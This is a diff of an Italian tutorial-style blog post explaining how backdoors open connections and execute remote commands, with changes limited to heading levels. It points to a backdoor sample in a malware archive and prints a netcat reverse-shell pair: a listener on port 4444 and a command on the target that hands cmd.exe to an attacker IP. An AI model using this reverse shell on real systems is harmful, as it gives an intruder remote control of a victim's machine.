@@ -26,7 +26,7 @@ e se per adesso ti sembra una utopia… non ti preoccupare. Io sono Matteo e ti 
 
 Farò in modo di intrattenerti e di non dilungarmi in nozioni troppo specifiche, tediose o inutili.
 
-# Funzionamento Backdoor
+## Funzionamento Backdoor
 
 Una Backdoor è un software installato nel computer di una cybervittima in qualche modo. Finché è attiva, la backdoor fa in modo di inviare informazioni e ricevere **istruzioni** da un host remoto.
 
@@ -40,7 +40,7 @@ Per ora vediamone in dettaglio in funzionamento:
 -  Come le backdoor iniziano una connessione tra computer
 -  Perché una backdoor rende il tuo PC una marionetta
 
-## Come si crea la connessione tra i computer
+### Come si crea la connessione tra i computer
 
 Qualcuno di voi si starà chiedendo in che modo i due computer coinvolti nell’atto di scambiarsi dati comunicano.   
 Le backdoor per le comunicazioni remote sfruttano il networking, gli indirizzi IP e le porte [0-36000].
@@ -64,7 +64,7 @@ Quando un qualsiasi host esterno (hacker) prova a comunicare attraverso quella p
 
 Adesso che la connessione è stabilita dobbiamo fare in modo che computer vittima **interpreti** quella serie di caratteri e di bit che stiamo comodamente digitando dalla nostra tastiera.
 
-# Perché una backdoor rende il tuo PC una marionetta
+## Perché una backdoor rende il tuo PC una marionetta
 
 Fin ora abbiamo visto come opera una backdoor quando viene eseguita da un computer. Ciò che manca al puzzle è comprendere in che modo i comandi inviati da noi vengono eseguiti dalla vittima.
 
@@ -104,7 +104,7 @@ Spaventoso, vero?
 
 Questa backdoor si chiama ShadyShell.c ed è disponibile nell’archivio di malware di vx-underground.
 
-# Come creare una backdoor con un comando
+## Come creare una backdoor con un comando
 
 Se ti dicessi che con un solo comando puoi creare una backdoor per (quasi) ogni sistema vulnerabile?
 
@@ -115,13 +115,13 @@ Normalmente risolverei un problema del genere scrivendo uno script o dei comandi
 Risoluzione con Bash & netcat:
 
 ```bash
-# Target: 172.16.166.130
+## Target: 172.16.166.130
 # Attacker: 192.168.1.116
 
-# On Attacker: set a verbose(v) communication listener(l) on port(p) 4444 
+## On Attacker: set a verbose(v) communication listener(l) on port(p) 4444 
 nc -lvp 4444 
 
-# On target: connect to host end execute(e) cmd.exe
+## On target: connect to host end execute(e) cmd.exe
 nc.exe 192.168.1.116 -e cmd.exe
 ```
 
